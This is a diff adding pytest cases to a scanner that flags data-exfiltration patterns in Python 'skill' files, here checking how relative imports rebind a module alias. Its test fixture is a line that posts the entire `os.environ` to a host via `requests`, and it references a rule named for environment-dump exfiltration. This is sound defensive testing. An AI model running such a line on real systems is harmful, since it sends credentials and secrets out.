@@ -1292,6 +1292,24 @@ def test_python_relative_package_import_proves_no_external_client(tmp_path: Path
     assert len(_client_exfil_heuristic_findings(_scan_skill_source(tmp_path / "absolute-heuristic", heuristic_shape.replace(f"from {prefix}requests", "from requests")))) == 1
 
 
+@pytest.mark.parametrize("rebind", ["from .helpers import client", "from . import client"])
+def test_python_relative_import_over_a_module_alias_drops_it(tmp_path: Path, rebind: str) -> None:
+    """A relative import rebinds a module alias too, not only a client handle.
+
+    The direct-call rules resolve `client.post` through the file-wide alias map. If an unresolvable
+    import merely skipped the map, `client` would still read as `requests` and `client.post` as a
+    proven network sink, hard-blocking a file whose `client` is a package-local object by the time
+    of the call. Without the rebind the same call really is `requests.post` and still blocks.
+    """
+    source = f"import os\nimport requests as client\n{rebind}\nclient.post(host, json=dict(os.environ))\n"
+
+    result = _scan_skill_source(tmp_path / "rebound", source)
+
+    assert result["blocked"] is False
+    assert all(finding["rule_id"] != "python-env-dump-exfil" for finding in result["findings"])
+    assert _scan_reports_client_exfil(tmp_path / "direct", source.replace(f"{rebind}\n", "")) is True
+
+
 def test_python_relative_import_over_a_live_handle_drops_it(tmp_path: Path) -> None:
     """A bare relative import binds its name without a resolvable module; the handle it replaces is still gone.
 
@@ -1504,6 +1522,8 @@ def test_python_client_exfil_heuristic_requires_a_constructor_supported_method(t
         # `ImportFrom.module` drops the dots, and `.requests` is not the external `requests`.
         ("from . import s\n", {}),
         ("from .requests import Session\n", {}),
+        # ...and it still rebinds the name, so an earlier resolvable alias under it is gone.
+        ("import requests as client\nfrom .helpers import client\n", {}),
     ],
 )
 def test_python_import_aliases_are_keyed_by_the_bound_name(source: str, expected: dict[str, str]) -> None:
